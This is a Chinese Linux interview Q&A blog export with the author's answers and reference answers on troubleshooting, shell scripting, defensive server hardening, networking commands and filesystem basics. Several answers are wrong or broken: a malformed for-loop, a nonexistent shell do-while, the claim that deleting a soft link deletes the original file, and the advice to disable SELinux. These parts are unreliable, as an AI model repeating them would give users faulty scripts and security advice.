、DB、还是游戏服务器。\n\n不同的用途，机器的配置会有所不同。\n\n\n2、确定好之后，就要定系统需要怎么安装，默认安装哪些系统、分区怎么做。\n3、需要优化系统的哪些参数，需要创建哪些用户等等的。\n\n⭐❤️😘✨18.请问当用户反馈网站访问慢，你会如何处理？作答\n问题排查：\n\n排查物理资源是否足够，前提是有资源监控（通常我的服务器都会在业务场景上部署资源监控程序），检查带宽、CPU负载、内存、磁盘空间和读写速度这些资源是否足够。\n排查web反代程序（如Nginx、Caddy、Traefik）配置是否正确。\n排查web程序并发是否达到上线前的压测（QPS、TPS）均值，合理的上线流程需要做好压测，估计并发量。\n做CDN测试，通常网络质量也是影响用户体验的关键数值。\n检测是否有洪水攻击、DDoS、CC，可能存在竞业攻击或者恶意攻击。\n\n性能优化：\n\n套CDN，做静态资源的多节点缓存。\nnginx做前端静态资源的压缩（gzip、brotli压缩算法支持）\n前后端分离，前端静态资源设计localstore缓存，减少不必要的网络请求\n后端做合并请求，减少请求数\n增加缓存中间件的设计，使用内存数据库(如redis)，将一些频繁请求又不常变化的数据缓存，提升IO性能。\n增加硬件资源（带宽、CPU、服务器集群等）\n前端做异步加载，一些数据量比较大的请求，使用Ajax\n后端将一些频繁查询数据库的接口，做数据缓存\n后端将一些计算量比较大却不会变动的聚合数据，做磁盘缓存\n\n答案\n有哪些方面的因素会导致网站网站访问慢？\n\n1、服务器出口带宽不够用\n\n\n本身服务器购买的出口带宽比较小。一旦并发量大的话，就会造成分给每个用户的出口带宽就小，访问速度自然就会慢。\n跨运营商网络导致带宽缩减。例如，公司网站放在电信的网络上，那么客户这边对接是长城宽带或联通，这也可能导致带宽的缩减。\n\n\n\n2、服务器负载过大，导致响应不过来\n\n可以从两个方面入手分析：\n\n分析系统负载，使用 w 命令或者 uptime 命令查看系统负载。如果负载很高，则使用 top 命令查看 CPU ，MEM 等占用情况，要么是 CPU 繁忙，要么是内存不够。\n如果这二者都正常，再去使用 sar 命令分析网卡流量，分析是不是遭到了攻击。一旦分析出问题的原因，采取对应的措施解决，如决定要不要杀死一些进程，或者禁止一些访问等。\n\n\n\n3、数据库瓶颈\n\n\n如果慢查询比较多。那么就要开发人员或 DBA 协助进行 SQL 语句的优化。\n如果数据库响应慢，考虑可以加一个数据库缓存，如 Redis 等。然后，也可以搭建 MySQL 主从，一台 MySQL 服务器负责写，其他几台从数据库负责读。\n\n\n\n4、网站开发代码没有优化好\n\n\n例如 SQL 语句没有优化，导致数据库读写相当耗时。\n\n\n针对网站访问慢，怎么去排查？\n\n1、首先要确定是用户端还是服务端的问题。当接到用户反馈访问慢，那边自己立即访问网站看看，如果自己这边访问快，基本断定是用户端问题，就需要耐心跟客户解释，协助客户解决问题。\n\n不要上来就看服务端的问题。一定要从源头开始，逐步逐步往下。\n\n\n2、如果访问也慢，那么可以利用浏览器的调试功能，看看加载那一项数据消耗时间过多，是图片加载慢，还是某些数据加载慢。\n\n3、针对服务器负载情况。查看服务器硬件(网络、CPU、内存)的消耗情况。如果是购买的云主机，比如阿里云，可以登录阿里云平台提供各方面的监控，比如 CPU、内存、带宽的使用情况。\n\n4、如果发现硬件资源消耗都不高，那么就需要通过查日志，比如看看 MySQL慢查询的日志，看看是不是某条 SQL 语句查询慢，导致网站访问慢。\n\n\n怎么去解决？\n\n1、如果是出口带宽问题，那么久申请加大出口带宽。\n2、如果慢查询比较多，那么就要开发人员或 DBA 协助进行 SQL 语句的优化。\n3、如果数据库响应慢，考虑可以加一个数据库缓存，如 Redis 等等。然后也可以搭建MySQL 主从，一台 MySQL 服务器负责写，其他几台从数据库负责读。\n4、申请购买 CDN 服务，加载用户的访问。\n5、如果访问还比较慢，那就需要从整体架构上进行优化咯。做到专角色专用，多台服务器提供同一个服务。\n\n19.如何排查 CPU load 过高问题？作答\n\ntop查看cpu avg，通常三个数值要低于CPU的核数才能确保资源满足，最佳状态不超过cpu核数*0.75\ntop/htop查看cpu占用资源最高的进程\n最后检查程序设计是否合理（例如递归问题）\n\n答案\n1. 首先排查哪些进程cpu占用率高。 通过命令 ps ux\n2. 查看对应java进程的每个线程的CPU占用率。通过命令：ps -Lp 15047 cu\n3. 追踪线程内部，查看load过高原因。通过命令：jstack 15047。或者打印线程 jstack pidof java &gt; stack.out\n查找到对应的threadid, 再反查代码。\n20.Linux 性能调优都有哪几种方法？作答\n\n设置swap缓存\n\n我觉得都问这个问题了，你服务器买好点吧。。。。。。low炮，linux开源系统经过长期考验，有什么好调？\n答案\n1、Disabling daemons (关闭 daemons)。\n2、Shutting down the GUI (关闭 GUI)。\n3、Changing kernel parameters (改变内核参数)。\n4、Kernel parameters (内核参数)。\n5、Tuning the processor subsystem (处理器子系统调优)。\n6、Tuning the memory subsystem (内存子系统调优)。\n7、Tuning the file system (文件系统子系统调优)。\n8、Tuning the network subsystem（网络子系统调优)。\n21.Shell 脚本是什么？作答\nLinux内置bash支持shell脚本语言，这是一种解释型编程语言。shell脚本实际上是集成了一些Linux命令和流程控制的代码程序，可以直接在Linux系统中运行，不需要额外安装编译器或者解释器。\n答案\n一个 Shell 脚本是一个文本文件，包含一个或多个命令。作为系统管理员，我们经常需要使用多个命令来完成一项任务，我们可以添加这些所有命令在一个文本文件(Shell 脚本)来完成这些日常工作任务。\n22.什么是默认登录 Shell ？作答\nLinux系统最基本的控制方式是通过CLI，而要操控Linux都是默认通过Bash Shell程序，进行命令行的交互式控制，所以Linux默认登录shell，才提供了交互式操控系统的功能。\n答案\n在 Linux 操作系统，&quot;&quot;/bin/bash&quot;&quot; 是默认登录 Shell，是在创建用户时分配的。\n使用 chsh 命令可以改变默认的 Shell 。示例如下所示：\n$ chsh &lt;用户名&gt; -s &lt;新shell&gt;$ chsh linuxtechi -s /bin/sh\n\n23.在 Shell 脚本中，如何写入注释？作答\n使用#号做注释符合，#所在行后面的字符将作为注释。\n答案\n注释可以用来描述一个脚本可以做什么和它是如何工作的。每一行注释以 # 开头。例子如下：\n#!/bin/bash# This is a commandecho &quot;I am logged in as $USER&quot;\n\n24.可以在 Shell 脚本中使用哪些类型的变量？作答\n\n数字类型\n字符类型\n\n答案\n在 Shell 脚本，我们可以使用两种类型的变量：\n\n系统定义变量\n\n系统变量是由系统系统自己创建的。这些变量通常由大写字母组成，可以通过 set 命令查看。\n\n\n用户定义变量\n\n用户变量由系统用户来生成和定义，变量的值可以通过命令 &quot;&quot;echo $&lt;变量名&gt;&quot;&quot; 查看。\n\n\n\n25.Shell脚本中 $? 标记的用途是什么？作答\n$?能够获取上一个逻辑判断语句的结果。\n答案\n在写一个 Shell 脚本时，如果你想要检查前一命令是否执行成功，在 if 条件中使用 $? 可以来检查前一命令的结束状态。\n\n如果结束状态是 0 ，说明前一个命令执行成功。例如：\nroot@localhost:~# ls /usr/bin/shar/usr/bin/sharroot@localhost:~# echo $?0\n如果结束状态不是0，说明命令执行失败。例如：\nroot@localhost:~# ls /usr/bin/sharels: cannot access /usr/bin/share: No such file or directoryroot@localhost:~# echo $?2\n\n26. Bourne Shell(bash) 中有哪些特殊的变量？作答\n答案\n下面的表列出了 Bourne Shell 为命令行设置的特殊变量。\n内建变量    解释$0    命令行中的脚本名字$1    第一个命令行参数$2    第二个命令行参数…..    …….$9    第九个命令行参数$#    命令行参数的数量$*    所有命令行参数，以空格隔开\n\n27.如何取消变量或取消变量赋值？作答\n答案\nunset 命令用于取消变量或取消变量赋值。语法如下所示：\n# unset &lt;变量名&gt;\n\n28.Shell 脚本中 if 语法如何嵌套？作答\nif [&#x27;&#x27;=&#x27;&#x27;];then\tif [];then\tiffi\n\n答案\nif [ 条件 ]then命令1命令2……elseif [ 条件 ]then命令1命令2….else命令1命令2……fifi\n\n29.在 Shell 脚本中如何比较两个数字？作答\nif [ 1 &lt; 2];then  echo &quot;1比2小&quot;fi\n\n答案\n在 if-then 中使用测试命令（ -gt 等）来比较两个数字。例如：\n#!/bin/bashx=10y=20if [ $x -gt $y ]thenecho &quot;x is greater than y&quot;elseecho &quot;y is greater than x&quot;fi\n\n30.Shell 脚本中 case 语句的语法？作答\n答案\n基础语法如下：\ncase 值 in模式1)    command1    command2    ...    commandN    ;;模式2)    command1    command2    ...    commandN    ;;esac\n\n31. Shell 脚本中 for 循环语法？作答\n答案\n与其他编程语言类似，Shell支持for循环。\nfor循环一般格式为：\nfor var in item1 item2 ... itemNdo    command1    command2    ...    commandNdone\n\n写成一行：\nfor var in item1 item2 ... itemN; do command1; command2… done;\n\n当变量值在列表里，for 循环即执行一次所有命令，使用变量名获取列表中的当前取值。命令可为任何有效的 shell 命令和语句。in 列表可以包含替换、字符串和文件名。\nin列表是可选的，如果不用它，for循环使用命令行的位置参数。\n例如，顺序输出当前列表中的数字：\n实例\nfor loop i 1 2 3 4 5do  echo &quot;The value is: $loop&quot;done\n\n输出结果：\nThe value is: 1The value is: 2The value is: 3The value is: 4The value is: 5\n\n顺序输出字符串中的字符：\n#!/bin/bashfor str in This is a stringdo    echo $strdone\n\n输出结果：\nThisisastring\n\n32.Shell 脚本中 while 循环语法？作答\n答案\nwhile 循环用于不断执行一系列命令，也用于从输入文件中读取数据。其语法格式为：\nwhile conditiondo    commanddone\n\n33. do-while 语句的基本格式？作答\n答案\ndo-while 语句类似于 while 语句，但检查条件语句之前先执行命令（LCTT 译注：意即至少执行一次。）。下面是用 do-while 语句的语法：\ndo&#123;命令&#125; while (条件)\n\n34.Shell 脚本中 break 命令的作用？作答\n退出循环、退出流程控制\n答案\nbreak 命令一个简单的用途是退出执行中的循环。我们可以在 while 和 until 循环中使用 break 命令跳出循环。\n35.Shell 脚本中 continue 命令的作用？作答\n答案\ncontinue 命令不同于 break 命令，它只跳出当前循环的迭代，而不是整个循环。continue 命令很多时候是很有用的，例如错误发生，但我们依然希望继续执行大循环的时候。\n36.如何使脚本可执行？作答\nchmod +x 文件路径添加可执行权限，或者使用bash 脚本文件直接执行\n答案\n37. #!/bin/bash 的作用？作答\n脚本首行添加，指定执行脚本的程序。同样适用于python。\n使用chmod添加可执行权限，可以直接通过./文件名执行脚本。\n答案\n#!/bin/bash 是 Shell 脚本的第一行，称为释伴（shebang）行。\n\n这里 # 符号叫做 hash ，而 ! 叫做 bang。\n它的意思是命令通过 /bin/bash 来执行。\n\n38.如何调试 Shell脚本？作答\n答案\n\n使用 -x&#39; 数（sh -x myscript.sh）可以调试 Shell脚本。\n\n另一个种方法是使用 -nv 参数(sh -nv myscript.sh)。\n\n\n⭐39.如何将标准输出和错误输出同时重定向到同一位置?作答\nbash xxx.sh 2&gt;&amp;1 &gt;&gt; xxx.log\n答案\n\n方法一：2&gt;&amp;1 (如# ls /usr/share/doc &gt; out.txt 2&gt;&amp;1 ) 。\n\n方法二：&amp;&gt; (如# ls /usr/share/doc &amp;&gt; out.txt ) 。\n\n\n40.在 Shell 脚本中，如何测试文件？作答\n答案\ntest 命令可以用来测试文件。基础用法如下表格：\nTest         用法-d 文件名    如果文件存在并且是目录，返回true-e 文件名    如果文件存在，返回true-f 文件名    如果文件存在并且是普通文件，返回true-r 文件名    如果文件存在并可读，返回true-s 文件名    如果文件存在并且不为空，返回true-w 文件名    如果文件存在并可写，返回true-x 文件名    如果文件存在并可执行，返回true\n\n41. 在 Shell 脚本如何定义函数呢？作答\n函数名()&#123;\techo &#x27;&#x27;&#125;\n\n答案\n函数是拥有名字的代码块。当我们定义代码块，我们就可以在我们的脚本调用函数名字，该块就会被执行。示例如下所示：\n$ diskusage () &#123; df -h ; &#125;译注：下面是我给的shell函数语法，原文没有[ function ] 函数名 [()]&#123;命令;[return int;]&#125;\n\n⭐42. 如何让 Shell 就脚本得到来自终端的输入?作答\nread命令\n答案\nread 命令可以读取来自终端（使用键盘）的数据。read 命令得到用户的输入并置于你给出的变量中。例子如下：\n# vi /tmp/test.sh#!/bin/bashecho &#x27;Please enter your name&#x27;read nameecho &quot;My Name is $name&quot;# ./test.shPlease enter your nameLinuxTechiMy Name is LinuxTechi\n\n⭐43.如何执行算术运算？作答\n+ - * / %\n答案\n有两种方法来执行算术运算：\n\n1、使用 expr 命令：# expr 5 + 2 。\n2、用一个美元符号和方括号（$[ 表达式 ]）：test=$[16 + 4] ; test=$[16 + 4] 。\n\n⭐44.一台 Linux 系统初始化环境后需要做一些什么安全工作？作答\n配置防火墙iptables、firewalld\n答案\n\n1、添加普通用户登陆，禁止 root 用户登陆，更改 SSH 端口号。\n\n2、服务器使用密钥登陆，禁止密码登陆。\n\n3、开启防火墙，关闭 SElinux ，根据业务需求设置相应的防火墙规则。\n\n4、装 fail2ban 这种防止 SSH 暴力破击的软件。\n\n5、设置只允许公司办公网出口 IP 能登陆服务器(看公司实际需要)\n\n6、修改历史命令记录的条数为 10 条。\n\n7、只允许有需要的服务器可以访问外网，其它全部禁止。\n\n8、做好软件层面的防护。\n\n8.1 设置 nginx_waf 模块防止 SQL 注入。\n\n8.2 把 Web 服务使用 www 用户启动，更改网站目录的所有者和所属组为 www 。\n\n\n\n\n45.什么叫 CC 攻击？什么叫 DDOS 攻击？作答\n答案\n\nCC 攻击，主要是用来攻击页面的，模拟多个用户不停的对你的页面进行访问，从而使你的系统资源消耗殆尽。\nDDOS 攻击，中文名叫分布式拒绝服务攻击，指借助服务器技术将多个计算机联合起来作为攻击平台，来对一个或多个目标发动 DDOS 攻击。\n\n⭐46.怎么预防 CC 攻击和 DDOS 攻击？作答\n\n使用高防IP服务，购买ISP的防御流量。\n配置CDN资源分发。\niptables在链路层做一些IP封禁的定时脚本（可能误杀用户，控制可接受的范围即可）。\ncloudflare的DNS自带cdn真实IP隐藏\nwaf（听说过，不了解）\n\n答案\n防 CC、DDOS 攻击，这些只能是用硬件防火墙做流量清洗，将攻击流量引入黑洞。\n\n流量清洗这一块，主要是买 ISP 服务商的防攻击的服务就可以，机房一般有空余流量，我们一般是买服务，毕竟攻击不会是持续长时间。\n例如说，《阿里云 —— DDoS 高防IP》 。\n\n⭐47.什么是网站数据库注入？作答\nSQL注入，一种网站攻击。还有XSS攻击\n通过web网站的前端输入框或者api接口传入SQL语句，直接操作数据库，达到攻击行为。\n预防方案：\n\n使用成熟的ORM框架，防注入。\n在前端进行正则审计，过滤sql语句。\n后端不通过传入的字符直接构造sql语句，使用预先构造并编译的sql语句，预防注入。\n\n答案\n\n由于程序员的水平及经验参差不齐，大部分程序员在编写代码的时候，没有对用户输入数据的合法性进行判断。\n应用程序存在安全隐患。用户可以提交一段数据库查询代码，根据程序返回的结果，获得某些他想得知的数据，这就是所谓的 SQL 注入。\nSQL注入，是从正常的 WWW 端口访问，而且表面看起来跟一般的 Web 页面访问没什么区别，如果管理员没查看日志的习惯，可能被入侵很长时间都不会发觉。\n\n48.如何过滤与预防？作答\n参考 37\n答案\n数据库网页端注入这种，可以考虑使用 nginx_waf 做过滤与预防。\n49.如何配置静态 IP ？作答\n答案\n测试服务器OS: Centos 6.5 x64本机OS: Ubuntu 14.04 x64\n\n由于Virtualbox当时安装Centos 6.5的时候设置的是自动获取的IP，所以局域网内每次启动，IP有时候会变化如果本地测试最好固定静态IP\n#用户root登陆到服务器，编辑配置信息vi /etc/sysconfig/network-scripts/ifcfg-eth0\n\n设置如下内容，有则改之，无则添加\nDEVICE=eth0BOOTPROT=staticIPADDR=192.168.1.200GATEWAY=192.168.1.1NETMASK=255.255.255.0ONBOOT=yes\n\n之后保存然后重启网卡即可\nservice network restart\n\n现在试试吧，IP已经变为192.168.1.200直接远程登陆\nssh root@192.168.1.200\n\n50.设置 DNS 需要修改哪个配置文件？作答\n/etc/hosts\n答案\n全局的配置，可以在 /etc/resolv.conf 文件中配置。\n指定网卡的配置，可以在 /etc/sysconfig/network-scripts/ifcfg-eth0 文件中配置。\n一般来说，肯定是全局配置即可。\n51./etc/hosts 文件什么做用？作答\n配置本地的域名和IP的映射关系，当网络请求，需要dns解析域名的时候，会优先使用该配置的IP地址。\n答案\n在 /etc/hosts 文中，我们可以配置指定域名和 IP 的映射关系。详细的，可以看看 《Linux环境下 /etc/hosts 文件详解》 文章。\n52. 在 Linux 下如何指定dns服务器，来解析某个域名？作答\n答案\n使用 dig 命令：dig @DNSip http://domain.com 。例如：\ndig @8.8.8.8 www.baidu.com # 使用谷歌 DNS 解析百度\n\n53.iptables 命令？作答\n答案\niptables ，是一个配置 Linux 内核防火墙的命令行工具。功能非常强大，对于我们开发来说，主要掌握如何开放端口即可。例如：\n\n把来源 IP 为 192.168.1.101 访问本机 80 端口的包直接拒绝：iptables -I INPUT -s 192.168.1.101 -p tcp --dport 80 -j REJECT 。\n\n开启 80 端口，因为web对外都是这个端口\niptables -A INPUT -p tcp --dport 80 -j ACCEP\n另外，要注意使用 iptables save 命令，进行保存。否则，服务器重启后，配置的规则将丢失。\n\n\n54.route 命令？作答\n答案\nroute命令用来显示并设置Linux内核中的网络路由表，route命令设置的路由主要是静态路由。要实现两个不同的子网之间的通信，需要一台连接两个网络的路由器，或者同时位于两个网络的网关来实现。\n在Linux系统中设置路由通常是为了解决以下问题：该Linux系统在一个局域网中，局域网中有一个网关，能够让机器访问Internet，那么就需要将这台机器的ip地址设置为Linux机器的默认路由。要注意的是，直接在命令行下执行route命令来添加路由，不会永久保存，当网卡重启或者机器重启之后，该路由就失效了；可以在/etc/rc.local中添加route命令来保证该路由设置永久有效。\n55.添加一条到 192.168.3.0/24 的路由，网关为 192.168.1.254 ？作答\n答案\n输入命令 route add -net 192.168.3.0/24 netmask 255.255.255.0 gw 192.168.1.254 。\n56.查看本机路由的三种方式？作答\n答案\n[root@centos6 ~]# route -nKernel IP routing tableDestination Gateway Genmask Flags Metric Ref Use Iface192.168.220.0 0.0.0.0 255.255.255.0 U 1 0 0 eth1169.254.0.0 0.0.0.0 255.255.0.0 U 1002 0 0 eth0172.16.0.0 0.0.0.0 255.255.0.0 U 0 0 0 eth00.0.0.0 172.16.0.1 0.0.0.0 UG 0 0 0 eth0[root@centos6 ~]# netstat -nrKernel IP routing tableDestination Gateway Genmask Flags MSS Window irtt Iface192.168.220.0 0.0.0.0 255.255.255.0 U 0 0 0 eth1169.254.0.0 0.0.0.0 255.255.0.0 U 0 0 0 eth0172.16.0.0 0.0.0.0 255.255.0.0 U 0 0 0 eth00.0.0.0 172.16.0.1 0.0.0.0 UG 0 0 0 eth0[root@centos6 ~]# ip route192.168.220.0/24 dev eth1 proto kernel scope link src 192.168.220.157 metric 1169.254.0.0/16 dev eth0 scope link metric 1002172.16.0.0/16 dev eth0 proto kernel scope link src 172.16.251.6default via 172.16.0.1 dev eth0 proto static\n\n57.tcpdump 命令？作答\n答案\ntcpdump命令是一款sniffer工具，它可以打印所有经过网络接口的数据包的头信息，也可以使用-w选项将数据包保存到文件中，方便以后分析。\n58. 在 Linux 系统下如何按照下面要求抓包：只过滤出访问 HTTP 服务的，目标 IP 为 192.168.0.111 ，一共抓 1000 个包，并且保存到 1.cap 文件中？？作答\n答案\ntcpdump -nn -s0 host 192.168.0.111 and port 80 -c 1000 -w 1.cap\n\n","categories":["操作系统","面试题","Linux"],"tags":["面试题","DDoS","Linux","操作系统","Shell脚本","性能调优","网络配置","Linux安全","SQL注入","iptables"]},{"title":"Linux面试题（二）：内核、启动、进程通信与文件系统","url":"/posts/23750.html","content":"操作系统题库（二）4.什么是 Linux 内核？作答：\nLinux内核是操作系统最基础的程序。其中包括设备CPU、GPU、摄像头、USB等驱动，包括文件管理程序、进程调度程序等最基本的底层功能程序。并提供一系列的底层接口，供应用层开发程序，例如视频播放器、浏览器等。\n参考答案：\nLinux 系统的核心是内核。内核控制着计算机系统上的所有硬件和软件，在必要时分配硬件，并根据需要执行软件。\n\n系统内存管理\n应用程序管理\n硬件设备管理\n文件系统管理\n\n5. Linux 开机启动过程？作答：\nLinux开机过程实际上是内核程序的启动，启动内存管理程序、进程调度程序。然后进度调度程序会去启动一些预设的自启的第三方应用，通常启动脚本配置在/etc/init.d目录下。\n参考答案：\n1、主机加电自检，加载 BIOS 硬件信息。\n\n2、读取 MBR 的引导文件(GRUB、LILO)。\n3、引导 Linux 内核。\n4、运行第一个进程 init (进程号永远为 1 )。\n5、进入相应的运行级别。\n6、运行终端，输入用户名和密码。\n\n6. Linux系统缺省的运行级别？作答：\n参考答案：\n\n关机。\n单机用户模式。\n字符界面的多用户模式(不支持网络)。\n字符界面的多用户模式。\n未分配使用。\n图形界面的多用户模式。\n重启。\n\n7. Linux 使用的进程间通信方式？作答：\n参考答案：\n\n管道(pipe)、流管道(s_pipe)、有名管道(FIFO)。\n\n信号(signal) 。\n\n消息队列。\n\n共享内存。\n\n信号量。\n\n套接字(socket) 。\n\n\n8. Linux 有哪些系统日志文件？作答：\n参考答案：\n参见 《Linux 系统日志及日志分析》 文章，比较重要的是 /var/log/messages 日志文件。\n\n该日志文件是许多进程日志文件的汇总，从该文件可以看出任何入侵企图或成功的入侵。\n另外，如果胖友的系统里有 ELK 日志集中收集，它也会被收集进去。\n\n9.Linux 虚拟内存是什么？作答：\n虚拟内存这里指的是swap吧，Linux Swap是将内存的一部分用于缓存文件，用于提升文件读写的性能，在进程需要分配内存的时候，又会将这部分脏页写入磁盘，将这部分内存用于应用程序。\n要知道通常内存和磁盘的读写性能都是有明显的差距，使用内存做文件缓存，能够提升IO读写。\n参考答案：\nLinux为每个进程维护了一个单独的虚拟地址空间。虚拟地址空间分为内核空间与用户空间，用户空间包括代码、数据、堆、共享库以及栈，内核空间包括内核中的代码和数据结构，内核空间的某些区域被映射到所有进程共享的物理页面。Linux也将一组连续的虚拟页面（大小等于内存总量）映射到相应的一组连续的物理页面，这种做法为内核提供了一种便利的方法来访问物理内存中任何特定的位置。\n\nLinux将虚拟内存组织成一些区域（也称为段）的集合，区域的概念允许虚拟地址空间有间隙。一个区域就是已经存在着的已分配的虚拟内存的连续片（chunk）。例如，代码段、数据段、堆、共享库段，以及用户栈都属于不同的区域，每个存在的虚拟页都保存在某个区域中，而不属于任何区域的虚拟页是不存在的，也不能被进程所引用。\n内核为系统中的每个进程维护一个单独的任务结构（task_struct）。任务结构中的元素包含或者指向内核运行该进程所需的所有信息（PID、指向用户栈的指针、可执行目标文件的名字、程序计数器等）。\n\n\nmm_struct：描述了虚拟内存的当前状态。pgd指向一级页表的基址（当内核运行这个进程时，pgd会被存放在CR3控制寄存器，也就是页表基址寄存器中），mmap指向一个vm_area_structs的链表，其中每个vm_area_structs都描述了当前虚拟地址空间的一个区域。\nvm_starts：指向这个区域的起始处。\nvm_end：指向这个区域的结束处。\nvm_prot：描述这个区域内包含的所有页的读写许可权限。\nvm_flags：描述这个区域内的页面是与其他进程共享的，还是这个进程私有的以及一些其他信息。\nvm_next：指向链表的下一个区域结构。\n\n10.简单 Linux 文件系统？作答：\n参考答案：\n在 Linux 操作系统中，所有被操作系统管理的资源，例如网络接口卡、磁盘驱动器、打印机、输入输出设备、普通文件或是目录都被看作是一个文件。\n也就是说在 Linux 系统中有一个重要的概念：一切都是文件。其实这是 Unix 哲学的一个体现，而 Linux 是重写 Unix 而来，所以这个概念也就传承了下来。在 Unix 系统中，把一切资源都看作是文件，包括硬件设备。UNIX系统把每个硬件都看成是一个文件，通常称为设备文件，这样用户就可以用读写文件的方式实现对硬件的访问。\nLinux 支持 5 种文件类型，如下图所示：\n11.Linux 的目录结构是怎样的？作答：\n参考答案：\nLinux 文件系统的结构层次鲜明，就像一棵倒立的树，最顶层是其根目录：Linux的目录结构\n常见目录说明：\n\n/bin： 存放二进制可执行文件(ls,cat,mkdir等)，常用命令一般都在这里；\n/etc： 存放系统管理和配置文件；\n/home： 存放所有用户文件的根目录，是用户主目录的基点，比如用户user的主目录就是/home/user，可以用~user表示；\n/usr ： 用于存放系统应用程序；\n/opt： 额外安装的可选应用程序包所放置的位置。一般情况下，我们可以把tomcat等都安装到这里；\n/proc： 虚拟文件系统目录，是系统内存的映射。可直接访问这个目录来获取系统信息；\n/root： 超级用户（系统管理员）的主目录（特权阶级o）；\n/sbin: 存放二进制可执行文件，只有root才能访问。这里存放的是系统管理员使用的系统级别的管理命令和程序。如ifconfig等；\n/dev： 用于存放设备文件；\n/mnt： 系统管理员安装临时文件系统的安装点，系统提供这个目录是让用户临时挂载其他的文件系统；\n/boot： 存放用于系统引导时使用的各种文件；\n/lib ： 存放着和系统运行相关的库文件 ；\n/tmp： 用于存放各种临时文件，是公用的临时文件存储点；\n/var： 用于存放运行时需要改变数据的文件，也是某些大文件的溢出区，比方说各种服务的日志文件（系统启动日志等。）等；\n/lost+found： 这个目录平时是空的，系统非正常关机而留下”无家可归”的文件（windows下叫什么.chk）就在这里。\n\n12. 什么是 inode ？作答：\n参考答案：\n理解inode，要从文件储存说起。\n文件储存在硬盘上，硬盘的最小存储单位叫做**”扇区”（Sector）。每个扇区储存512字节（相当于0.5KB）**。\n操作系统读取硬盘的时候，不会一个个扇区地读取，这样效率太低，而是一次性连续读取多个扇区，即一次性读取一个”块”（block）。这种由多个扇区组成的”块”，是文件存取的最小单位。”块”的大小，最常见的是4KB，即连续八个 sector组成一个 block。\n文件数据都储存在”块”中，那么很显然，我们还必须找到一个地方储存文件的元信息，比如文件的创建者、文件的创建日期、文件的大小等等。这种储存文件元信息的区域就叫做inode，中文译名为**”索引节点”**。\n每一个文件都有对应的inode，里面包含了与该文件有关的一些信息。\n13.简述 Linux 文件系统通过 inode 节点把文件的逻辑结构和物理结构转换的工作过程？作答：\n参考答案：\nLinux 通过 inode 节点表将文件的逻辑结构和物理结构进行转换。\n\ninode 节点是一个 64 字节长的表，表中包含了文件的相关信息，其中有文件的大小、文件所有者、文件的存取许可方式以及文件的类型等重要信息。在 inode 节点表中最重要的内容是磁盘地址表。在磁盘地址表中有 13 个块号，文件将以块号在磁盘地址表中出现的顺序依次读取相应的块。\nLinux 文件系统通过把 inode 节点和文件名进行连接，当需要读取该文件时，文件系统在当前目录表中查找该文件名对应的项，由此得到该文件相对应的 inode 节点号，通过该 inode 节点的磁盘地址表把分散存放的文件物理块连接成文件的逻辑结构。\n\n14.什么是硬链接和软链接？作答：\n软连接是指将一个链接文件的路径指向一个原始文件的所在路径，链接文件类似windows的快捷方式，并未在内存中真正存在，当访问链接文件时，会指向真实文件所在路径。\n参考答案：\n\n硬链接\n\n由于 Linux 下的文件是通过索引节点(inode)来识别文件，硬链接可以认为是一个指针，指向文件索引节点的指针，系统并不为它重新分配 inode 。每添加一个一个硬链接，文件的链接数就加 1 。\n\n\n\n\n不足：1）不可以在不同文件系统的文件间建立链接；2）只有超级用户才可以为目录创建硬链接。\n\n\n软链接\n\n软链接克服了硬链接的不足，没有任何文件系统的限制，任何用户可以创建指向目录的符号链接。因而现在更为广泛使用，它具有更大的灵活性，甚至可以跨越不同机器、不同网络对文件进行链接。\n\n\n\n\n不足：因为链接文件包含有原文件的路径信息，所以当原文件从一个目录下移到其他目录中，再访问链接文件，系统就找不到了，而硬链接就没有这个缺陷，你想怎么移就怎么移；还有它要系统分配额外的空间用于建立新的索引节点和保存原文件的路径。\n\n总结区别如下：\n\n硬链接不可以跨分区，软件链可以跨分区。\n硬链接指向一个 inode 节点，而软链接则是创建一个新的 inode 节点。\n删除硬链接文件，不会删除原文件，删除软链接文件，会把原文件删除。\n\n15.RAID 是什么？作答：\n参考答案：\nRAID 全称为独立磁盘冗余阵列(Redundant Array of Independent Disks)，基本思想就是把多个相对便宜的硬盘组合起来，成为一个硬盘阵列组，使性能达到甚至超过一个价格昂贵、 容量巨大的硬盘。RAID 通常被用在服务器电脑上，使用完全相同的硬盘组成一个逻辑扇区，因此操作系统只会把它当做一个硬盘。\nRAID 分为不同的等级，各个不同的等级均在数据可靠性及读写性能上做了不同的权衡。在实际应用中，可以依据自己的实际需求选择不同的 RAID 方案。\n","categories":["Linux","面试题","操作系统"],"tags":["Linux","操作系统","Linux面试题","内核","启动流程","进程间通信","IPC","虚拟内存","文件系统","inode","硬链接","软链接"]},{"title":"认真就能打动人：273篇干货资料汇总","url":"/posts/2352.html","content":"来自公众号Python与算法社区的汇总\n\n\n\n\n","tags":["Python","人工智能"]}]